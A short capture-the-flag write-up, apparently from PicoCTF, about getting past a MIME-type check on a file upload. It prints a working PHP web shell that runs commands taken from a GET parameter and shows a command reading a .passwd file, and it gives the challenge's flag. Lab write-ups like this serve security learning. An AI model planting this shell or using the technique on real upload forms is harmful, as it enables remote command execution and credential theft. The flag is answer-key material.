#MIME #php-MIME #PHP-MIME #php-c 

##### Challenge Description

What is MIME type ?

A **MIME type** (Multipurpose Internet Mail Extensions) is a standard label used by browsers and servers to identify the nature and format of a file, such as `text/html` or `image/png`. It ensures that the software knows exactly how to process or display a piece of data based on its specific media type rather than just its file extension.


Let's look at the request when I upload a false image :

I changed the name of t

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203429.png)


I can then to do this :

```
\\Example
image?c=id
```

The Payload :

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```


![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203756.png)

Then open in a new tab the malicious php code then put in it Burp Repeater like this :

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203734.png)

Look at the response ! It is vulnerable !

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203911.png)

Now that we know that it is working let's find the flag

```
cat ../../../.passwd
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307203353.png)

Flag : a7n4nizpgQgnPERy89uanf6T4